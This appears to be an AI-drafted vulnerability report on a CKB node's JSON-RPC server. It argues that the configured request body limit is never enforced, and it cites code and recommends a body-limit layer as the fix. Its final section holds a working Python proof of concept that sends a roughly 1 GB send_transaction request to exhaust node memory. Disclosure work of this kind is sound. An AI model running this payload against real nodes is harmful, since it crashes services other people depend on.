The critical issue here is that `max_request_body_size` is defined in the config but **never applied** to the axum HTTP server. Let me confirm this fully.

### Title
`max_request_body_size` Config Never Enforced — Unbounded Allocation in `BytesVisitor::visit_str` via `send_transaction` RPC - (`util/jsonrpc-types/src/bytes.rs`, `rpc/src/server.rs`)

---

### Summary

The `max_request_body_size` configuration field is defined and documented but is **never wired into the axum HTTP server**. As a result, any caller with RPC access can POST an arbitrarily large JSON body. `BytesVisitor::visit_str` allocates `N/2` bytes from the hex string before any transaction size check is applied, enabling a trivial OOM crash.

---

### Finding Description

**Step 1 — Dead config field.**

`max_request_body_size` is declared in `RpcConfig`: [1](#0-0) 

It is set to `10 * 1024 * 1024` (10 MiB) in the default template: [2](#0-1) 

However, a grep across all of `rpc/src/**/*.rs` finds **zero** uses of `max_request_body_size` outside of the test setup file. The axum server in `start_server()` builds its router with no body-size middleware — no `DefaultBodyLimit`, no `tower_http` body limit layer, nothing: [3](#0-2) 

The `handle_jsonrpc` handler receives the raw body as `Bytes` with no prior size gate: [4](#0-3) 

**Step 2 — Unbounded allocation in `BytesVisitor::visit_str`.**

`serde_json::from_str::<Request>(req)` at line 238 triggers full deserialization of the JSON body, including the `Script.args` field. `BytesVisitor::visit_str` allocates a buffer of exactly `bytes.len() >> 1` bytes — half the hex string length — with no size guard: [5](#0-4) 

**Step 3 — Size checks come after allocation.**

`TRANSACTION_SIZE_LIMIT` (512 KB) is only checked inside `non_contextual_verify`, which runs in the tx-pool processing path — well after the JSON deserialization and the heap allocation have already completed: [6](#0-5) [7](#0-6) 

**Step 4 — TCP path has a limit; HTTP path does not.**

The TCP RPC server applies a `LinesCodec::new_with_max_length(2 * 1024 * 1024)` (2 MiB): [8](#0-7) 

The HTTP server has no equivalent guard.

---

### Impact Explanation

An attacker with HTTP RPC access sends a single POST request whose `args` field is `"0x"` followed by `2*N` hex characters. The node allocates `N` bytes on the heap before any rejection logic runs. With `N = 500_000_000` the node attempts a ~500 MB allocation per request; a handful of concurrent requests exhaust available memory and crash the process (OOM kill or panic). This is a complete denial-of-service against the node.

---

### Likelihood Explanation

The default config binds to `127.0.0.1:8114` (localhost only), which limits the attacker surface to local processes. However:

- Many operators expose the RPC port publicly (the config itself warns against this but it is common practice).
- A malicious local process or a compromised co-tenant on the same host can exploit this trivially.
- The `max_request_body_size` config gives operators a false sense of protection — they set it, it is silently ignored.

The exploit requires no authentication, no PoW, no valid UTXO, and no prior state. A single HTTP request is sufficient to trigger a large allocation.

---

### Recommendation

Apply `tower_http::limit::RequestBodyLimitLayer` (or axum's `DefaultBodyLimit::max(...)`) using the configured `max_request_body_size` value when building the axum router in `start_server()`:

```rust
use tower_http::limit::RequestBodyLimitLayer;

let app = Router::new()
    // ... routes ...
    .layer(RequestBodyLimitLayer::new(config.max_request_body_size))
    // ... other layers ...
```

This ensures the HTTP body is rejected at the transport layer before any JSON parsing or heap allocation occurs.

---

### Proof of Concept

```python
import socket, json

# 500_000_000 decoded bytes → ~500 MB allocation in visit_str
args = "0x" + "cc" * 500_000_000

payload = json.dumps({
    "jsonrpc": "2.0",
    "id": 1,
    "method": "send_transaction",
    "params": [{
        "version": "0x0",
        "cell_deps": [],
        "header_deps": [],
        "inputs": [],
        "outputs": [{
            "capacity": "0x2540be400",
            "lock": {
                "code_hash": "0x" + "00" * 32,
                "hash_type": "data",
                "args": args   # ← triggers BytesVisitor::visit_str
            }
        }],
        "outputs_data": ["0x"],
        "witnesses": []
    }, "passthrough"]
})

body = payload.encode()
req = (
    f"POST / HTTP/1.1\r\n"
    f"Host: 127.0.0.1:8114\r\n"
    f"Content-Type: application/json\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"\r\n"
).encode() + body

s = socket.create_connection(("127.0.0.1", 8114))
s.sendall(req)
# Node OOMs before responding; no bounded error at the JSON layer.
```

The node will attempt to allocate ~500 MB inside `BytesVisitor::visit_str` before any tx-pool size check is reached. The `max_request_body_size = 10485760` config entry is silently ignored.

### Citations

**File:** util/app-config/src/configs/rpc.rs (L39-40)
```rust
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
```

**File:** resource/ckb.toml (L186-187)
```text
# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L165-165)
```rust
            let codec = LinesCodec::new_with_max_length(2 * 1024 * 1024);
```

**File:** rpc/src/server.rs (L218-238)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
```

**File:** util/jsonrpc-types/src/bytes.rs (L100-106)
```rust
        let bytes = &v.as_bytes()[2..];
        if bytes.is_empty() {
            return Ok(JsonBytes::default());
        }
        let mut buffer = vec![0; bytes.len() >> 1]; // we checked length
        hex_decode(bytes, &mut buffer).map_err(|e| E::custom(format_args!("{e:?}")))?;
        Ok(JsonBytes::from_vec(buffer))
```

**File:** tx-pool/src/util.rs (L67-73)
```rust
    let tx_size = tx.data().serialized_size_in_block() as u64;
    if tx_size > TRANSACTION_SIZE_LIMIT {
        return Err(Reject::ExceededTransactionSizeLimit(
            tx_size,
            TRANSACTION_SIZE_LIMIT,
        ));
    }
```

**File:** util/types/src/core/tx_pool.rs (L309-309)
```rust
pub const TRANSACTION_SIZE_LIMIT: u64 = 512 * 1_000;
```
